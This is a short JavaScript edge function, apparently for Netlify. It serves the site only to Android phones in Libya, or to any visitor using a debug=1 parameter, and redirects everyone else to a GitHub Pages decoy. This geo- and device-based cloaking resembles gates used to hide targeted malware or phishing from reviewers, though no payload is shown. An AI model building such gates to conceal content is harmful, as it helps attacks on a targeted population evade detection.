function isAndroidPhone(ua) {
  return /Android/i.test(ua) && /Mobile/i.test(ua);
}

export const config = { path: "/*" };

export default async (request, context) => {
  const url = new URL(request.url);
  const debug = url.searchParams.get("debug") === "1";

  if (debug) {
    return context.next();
  }

  const countryCode = context.geo?.country?.code || "";
  const ua = request.headers.get("user-agent") || "";

  const fromLibya = countryCode === "LY";
  const androidPhone = isAndroidPhone(ua);

  if (fromLibya && androidPhone) {
    return context.next();
  }

  return Response.redirect("https://superwork61-creator.github.io/balenformen/", 302);
};
